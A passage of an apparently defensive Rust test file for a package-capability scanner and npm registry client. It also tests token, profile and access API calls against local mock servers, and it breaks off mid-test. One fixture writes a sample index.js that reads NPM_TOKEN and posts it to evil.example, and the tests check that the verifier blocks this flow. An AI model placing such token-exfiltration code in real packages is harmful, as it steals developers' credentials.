        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "b.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "a.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "b.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "a.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "b.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let cap_ops = module.functions[0]
        .code
        .iter()
        .filter(|op| matches!(op, Op::Cap(_)))
        .count();

    // Findings dedup by (kind, target) to 3 unique caps: EnvRead(NPM_TOKEN),
    // FsRead(*), HttpRequest(evil.example). The F2 flow model then emits one
    // `push source; consume in sink` pair per (source x sink) = 2 sources x
    // 1 sink = 2 pairs = 4 cap ops (env->http and fs-read->http both modeled).
    assert_eq!(cap_ops, 4);
}

#[test]
fn detects_all_host_grants_for_flow_escape_hatch() {
    let grants = vec![
        Capability::EnvRead("*".to_owned()),
        Capability::FsRead("*".to_owned()),
        Capability::FsWrite("*".to_owned()),
        Capability::HttpHost("*".to_owned()),
        Capability::DnsHost("*".to_owned()),
        Capability::ProcSpawn("*".to_owned()),
        Capability::DynamicEval,
    ];

    assert!(grants_all_host_capabilities(&grants));
    assert!(!grants_all_host_capabilities(&grants[..grants.len() - 1]));
}

#[test]
fn generated_profile_module_models_static_env_to_network_flow() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static env read `NPM_TOKEN`".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static URL host `evil.example`".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let http = module.functions[0]
        .code
        .iter()
        .find_map(|op| match op {
            Op::Cap(CapOp::HttpRequest { request }) => Some(request),
            _ => None,
        })
        .unwrap();
    assert!(http.body_from_stack);

    let policy = Policy::pure()
        .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
        .allow_capability(Capability::HttpHost("evil.example".to_owned()));
    let error = verify_module(&module, &policy).unwrap_err();
    assert!(error.findings.iter().any(|finding| finding
        .message
        .contains("env:NPM_TOKEN may not flow to network:evil.example")));
}

#[test]
fn compile_source_directory_emits_signed_verifiable_artifact() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
            source.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
        )
        .unwrap();
    fs::create_dir_all(source.join("node_modules/noisy")).unwrap();
    fs::write(
        source.join("node_modules/noisy/index.js"),
        "fetch('https://ignored.example')\n",
    )
    .unwrap();

    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        allowed_capabilities: vec![
            Capability::EnvRead("NPM_TOKEN".to_owned()),
            Capability::HttpHost("evil.example".to_owned()),
        ],
        allowed_flows: Vec::new(),
        write_artifact: true,
    })
    .unwrap();

    assert_eq!(report.artifact.package.name, "date-helper");
    assert_eq!(report.artifact.files_scanned, 1);
    assert_eq!(report.artifact.behavior, Behavior::HostCapability);
    assert_eq!(report.artifact.verdict, Verdict::Blocked);
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
    assert!(!report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.target == "ignored.example"));
    assert!(report
        .artifact
        .verifier_findings
        .iter()
        .any(|finding| finding.contains("env:NPM_TOKEN may not flow to network:evil.example")));
    verify_artifact_signature(&report.artifact).unwrap();
    let artifact_path = report.artifact_path.unwrap();
    assert!(artifact_path.ends_with("omc.json"));
    let stored: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&stored).unwrap();
}

#[test]
fn profiler_ignores_tests_and_packaging_files() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
    profiler.scan_file("pkg/setup.py", "open('README.md').read()");
    let profile = profiler.finish();
    assert!(profile.capabilities.is_empty());
    assert_eq!(profile.files_scanned, 0);
}

#[test]
fn parses_python_script_entry_points() {
    let entries = parse_python_entry_points(
        r#"
            [console_scripts]
            normalizer = charset_normalizer.cli.normalizer:cli_detect

            [gui_scripts]
            image-viewer = localpkg.gui:main
            "#,
    );
    assert_eq!(
        entries,
        vec![
            PythonEntryPoint {
                name: "normalizer".to_owned(),
                module: "charset_normalizer.cli.normalizer".to_owned(),
                function: "cli_detect".to_owned(),
            },
            PythonEntryPoint {
                name: "image-viewer".to_owned(),
                module: "localpkg.gui".to_owned(),
                function: "main".to_owned(),
            }
        ]
    );
}

#[test]
fn parses_npm_search_response_packages() {
    let response = serde_json::from_str::<NpmSearchResponse>(
        r#"
            {
              "objects": [
                {
                  "package": {
                    "name": "pad-left",
                    "keywords": ["pad", "left"],
                    "version": "2.1.0",
                    "description": "Left pad a string",
                    "sanitized_name": "pad-left",
                    "publisher": {"username": "alice", "email": "alice@example.invalid"},
                    "maintainers": [{"username": "alice"}],
                    "license": "MIT",
                    "date": "2016-05-07T10:18:51.750Z",
                    "links": {"npm": "https://www.npmjs.com/package/pad-left"}
                  }
                }
              ]
            }
            "#,
    )
    .unwrap();

    assert_eq!(response.objects.len(), 1);
    let package = &response.objects[0].package;
    assert_eq!(package.name, "pad-left");
    assert_eq!(package.version, "2.1.0");
    assert_eq!(package.keywords, vec!["pad", "left"]);
    assert_eq!(
        package.links.get("npm").map(String::as_str),
        Some("https://www.npmjs.com/package/pad-left")
    );
}

#[test]
fn python_entry_points_strip_global_site_packages() {
    let script = python_entry_point_script(&PythonEntryPoint {
        name: "normalizer".to_owned(),
        module: "charset_normalizer.cli.normalizer".to_owned(),
        function: "cli_detect".to_owned(),
    });

    assert!(script.contains("_python_dir / \"site-packages\""));
    assert!(script.contains("_python_dir / \"local-paths\""));
    assert!(script.contains("path not in _project_paths"));
    assert!(script.contains("\"site-packages\" not in path"));
    assert!(script.contains("\"dist-packages\" not in path"));
}

#[test]
fn parses_capability_grants() {
    assert_eq!(
        parse_capability_grant("http:api.example.com").unwrap(),
        Capability::HttpHost("api.example.com".to_owned())
    );
    assert_eq!(
        parse_capability_grant("env:API_TOKEN").unwrap(),
        Capability::EnvRead("API_TOKEN".to_owned())
    );
    assert_eq!(
        parse_capability_grant("dynamic-eval").unwrap(),
        Capability::DynamicEval
    );
}

#[test]
fn parses_flow_rules() {
    assert_eq!(
        parse_flow_rule("env:API_TOKEN -> network:api.example.com").unwrap(),
        FlowRule::new(
            LabelMatcher::Env("API_TOKEN".to_owned()),
            Sink::Network("api.example.com".to_owned())
        )
    );
    assert_eq!(
        parse_flow_rule("*->dynamic.eval").unwrap(),
        FlowRule::new(LabelMatcher::Any, Sink::Eval)
    );
}

#[test]
fn parses_npmrc_registry_and_auth_config() {
    let mut config = NpmConfig::default();
    parse_npmrc_content(
        r#"
            registry=https://registry.example.invalid/npm
            @scope:registry=https://scope.example.invalid/
            //scope.example.invalid/:_authToken=scope-token
            //registry.example.invalid/npm/:_authToken=default-token
            //registry.example.invalid:4873/npm/:_authToken=port-token
            "#,
        &mut config,
    );

    assert_eq!(config.registry, "https://registry.example.invalid/npm/");
    assert_eq!(
        config.registry_for("left-pad"),
        "https://registry.example.invalid/npm/"
    );
    assert_eq!(
        config.registry_for("@scope/pkg"),
        "https://scope.example.invalid/"
    );
    assert_eq!(
        config.auth_token_for_url("https://scope.example.invalid/@scope%2fpkg"),
        Some("scope-token")
    );
    assert_eq!(
        config.auth_token_for_url("https://registry.example.invalid/npm/left-pad/-/left-pad.tgz"),
        Some("default-token")
    );
    assert_eq!(
        config.auth_token_for_url(
            "https://registry.example.invalid:4873/npm/left-pad/-/left-pad.tgz"
        ),
        Some("port-token")
    );
}

#[test]
fn downloads_npm_package_tarball_with_userconfig_auth() {
    use std::io::Write as _;

    let tarball = npm_tgz_for_test(r#"{ "name": "demo-pkg", "version": "1.0.1" }"#);
    let expected = tarball.clone();
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let root = format!(
            r#"{{
                  "dist-tags": {{"latest": "1.0.1"}},
                  "versions": {{
                    "1.0.1": {{"name": "demo-pkg", "version": "1.0.1", "dist": {{"tarball": "http://{addr}/demo-pkg/-/demo-pkg-1.0.1.tgz"}}}}
                  }}
                }}"#
        );
        let version = format!(
            r#"{{
                  "name": "demo-pkg",
                  "version": "1.0.1",
                  "dist": {{"tarball": "http://{addr}/demo-pkg/-/demo-pkg-1.0.1.tgz"}}
                }}"#
        );

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                root.len(),
                root
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg/1.0.1 "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                version.len(),
                version
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg/-/demo-pkg-1.0.1.tgz "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                expected.len()
            );
        stream.write_all(response.as_bytes()).unwrap();
        stream.write_all(&expected).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg@^1.0.0").unwrap();
    let result =
        download_npm_package_tarball(dir.path(), &spec, None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(result.metadata.name, "demo-pkg");
    assert_eq!(result.metadata.version, "1.0.1");
    assert_eq!(result.bytes, tarball);
    handle.join().unwrap();
}

#[test]
fn reads_npm_whoami_with_userconfig_auth() {
    use std::io::{Read as _, Write as _};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut buffer = [0_u8; 4096];
        let len = stream.read(&mut buffer).unwrap();
        let request = String::from_utf8_lossy(&buffer[..len]);
        assert!(request.starts_with("GET /-/whoami "));
        assert!(request
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));

        let body = r#"{"username":"alice"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let whoami = read_npm_whoami(dir.path(), None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(whoami.registry, format!("http://{addr}/"));
    assert_eq!(whoami.username, "alice");
    assert_eq!(
        whoami
            .response
            .get("username")
            .and_then(serde_json::Value::as_str),
        Some("alice")
    );
    handle.join().unwrap();
}

#[test]
fn reads_npm_profile_with_userconfig_auth() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/npm/v1/user "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));

        let body = r#"{"name":"alice","email":"alice@example.invalid","email_verified":true,"tfa":{"pending":false,"mode":"auth-and-writes"},"fullname":"Alice Example","github":"alice"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let profile = read_npm_profile(dir.path(), None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(profile.registry, format!("http://{addr}/"));
    assert_eq!(
        profile
            .profile
            .get("name")
            .and_then(serde_json::Value::as_str),
        Some("alice")
    );
    assert_eq!(
        profile
            .profile
            .get("tfa")
            .and_then(|tfa| tfa.get("mode"))
            .and_then(serde_json::Value::as_str),
        Some("auth-and-writes")
    );
    handle.join().unwrap();
}

#[test]
fn sets_npm_profile_property_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/npm/v1/user "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"name":"alice","email":"alice@example.invalid","fullname":"Alice Example","homepage":"","github":"alice"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("POST /-/npm/v1/user "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["email"], "alice@example.invalid");
        assert_eq!(body["fullname"], "Alice Updated");
        assert_eq!(body["github"], "alice");

        let response_body = r#"{"name":"alice","email":"alice@example.invalid","fullname":"Alice Updated","homepage":"","github":"alice"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let result = set_npm_profile_property(
        dir.path(),
        "fullname",
        "Alice Updated",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.property, "fullname");
    assert_eq!(result.value, serde_json::json!("Alice Updated"));
    assert_eq!(result.status, 200);
    handle.join().unwrap();
}

#[test]
fn reads_npm_token_list_with_userconfig_auth() {
    use std::io::{Read as _, Write as _};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut buffer = [0_u8; 4096];
        let len = stream.read(&mut buffer).unwrap();
        let request = String::from_utf8_lossy(&buffer[..len]);
        assert!(request.starts_with("GET /-/npm/v1/tokens?perPage=1000 "));
        assert!(request
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));

        let body = r#"{
              "objects": [
                {
                  "key": "a1b2c3",
                  "token": "npm_aBcD...7890",
                  "readonly": true,
                  "cidr": ["192.0.2.0/24"],
                  "created": "2026-05-23T00:00:00Z"
                }
              ],
              "total": 1,
              "urls": {"next": "https://registry.example.invalid/-/npm/v1/tokens?page=1"}
            }"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let list = read_npm_token_list(dir.path(), None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(list.registry, format!("http://{addr}/"));
    assert_eq!(list.total, Some(1));
    assert_eq!(list.tokens.len(), 1);
    assert_eq!(list.tokens[0].key.as_deref(), Some("a1b2c3"));
    assert_eq!(list.tokens[0].readonly, Some(true));
    assert_eq!(list.tokens[0].cidr, vec!["192.0.2.0/24"]);
    assert_eq!(
        list.urls.get("next").map(String::as_str),
        Some("https://registry.example.invalid/-/npm/v1/tokens?page=1")
    );
    handle.join().unwrap();
}

#[test]
fn creates_npm_token_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("POST /-/npm/v1/tokens "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));

        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["password"], "correct-horse");
        assert_eq!(body["name"], "ci-publish");
        assert_eq!(body["description"], "publish from CI");
        assert_eq!(body["expires"], 30);
        assert_eq!(body["packages"], serde_json::json!(["@demo/pkg"]));
        assert_eq!(body["packages_all"], true);
        assert_eq!(body["scopes"], serde_json::json!(["@demo"]));
        assert_eq!(body["orgs"], serde_json::json!(["demo-org"]));
        assert_eq!(body["packages_and_scopes_permission"], "read-write");
        assert_eq!(body["orgs_permission"], "read-only");
        assert_eq!(body["cidr_whitelist"], serde_json::json!(["192.0.2.0/24"]));
        assert_eq!(body["bypass_2fa"], true);

        let response_body = r#"{
              "key": "a1b2c3",
              "token": "npm_full_created_token",
              "readonly": false,
              "cidr_whitelist": ["192.0.2.0/24"],
              "created": "2026-05-23T00:00:00Z",
              "expires": "2026-06-22T00:00:00Z",
              "updated": "2026-05-23T00:00:00Z"
            }"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let created = create_npm_token(
        dir.path(),
        NpmTokenCreateOptions {
            password: Some("correct-horse".to_owned()),
            name: Some("ci-publish".to_owned()),
            description: Some("publish from CI".to_owned()),
            expires: Some(30),
            packages: vec!["@demo/pkg".to_owned()],
            packages_all: true,
            scopes: vec!["@demo".to_owned()],
            orgs: vec!["demo-org".to_owned()],
            packages_and_scopes_permission: Some("read-write".to_owned()),
            orgs_permission: Some("read-only".to_owned()),
            cidr: vec!["192.0.2.0/24".to_owned()],
            bypass_2fa: true,
            read_only: false,
        },
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(created.registry, format!("http://{addr}/"));
    assert_eq!(created.status, 201);
    assert_eq!(
        created.token.token.as_deref(),
        Some("npm_full_created_token")
    );
    assert_eq!(created.token.cidr, vec!["192.0.2.0/24"]);
    assert_eq!(
        created.token.expiry.as_deref(),
        Some("2026-06-22T00:00:00Z")
    );
    handle.join().unwrap();
}

#[test]
fn revokes_npm_token_with_userconfig_auth_and_otp() {
    use std::io::{Read as _, Write as _};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut buffer = [0_u8; 4096];
        let len = stream.read(&mut buffer).unwrap();
        let request = String::from_utf8_lossy(&buffer[..len]);
        assert!(request.starts_with("DELETE /-/npm/v1/tokens/token/a1b2c3 "));
        let lower = request.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));

        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let revoked = revoke_npm_token(
        dir.path(),
        "a1b2c3",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(revoked.registry, format!("http://{addr}/"));
    assert_eq!(revoked.token, "a1b2c3");
    assert_eq!(revoked.status, 204);
    handle.join().unwrap();
}

#[test]
fn reads_and_sets_npm_access_status_and_mfa() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/package/%40demo%2Fpkg/visibility "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"public":false}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("POST /-/package/%40demo%2Fpkg/access "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"access": "public"}));
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("POST /-/package/%40demo%2Fpkg/access "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(
            body,
            serde_json::json!({
                "publish_requires_tfa": true,
                "automation_token_overrides_tfa": true
            })
        );
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 202 Accepted\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let status =
        read_npm_access_status(dir.path(), "@demo/pkg", None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(status.registry, format!("http://{addr}/"));
    assert_eq!(status.package, "@demo/pkg");
    assert_eq!(status.status, "private");

    let changed = set_npm_access_status(
        dir.path(),
        "@demo/pkg",
        "public",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(changed.registry, format!("http://{addr}/"));
    assert_eq!(changed.package, "@demo/pkg");
    assert_eq!(changed.action, "status");
    assert_eq!(changed.status, 200);
    assert_eq!(changed.response["ok"], true);

    let mfa = set_npm_access_mfa(
        dir.path(),
        "@demo/pkg",
        "automation",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(mfa.action, "mfa");
    assert_eq!(mfa.status, 202);
    handle.join().unwrap();
}

#[test]
fn lists_and_mutates_npm_access_team_permissions() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/team/demo/publishers/package "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"@demo/pkg":"write","@demo/readme":"read"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/package/%40demo%2Fpkg/collaborators "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"alice":"write","bob":"read"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /-/team/demo/publishers/package "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(
            body,
            serde_json::json!({
                "package": "@demo/pkg",
                "permissions": "read-write"
            })
        );
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /-/team/demo/publishers/package "));
        let lower = headers.to_ascii_lowercase();
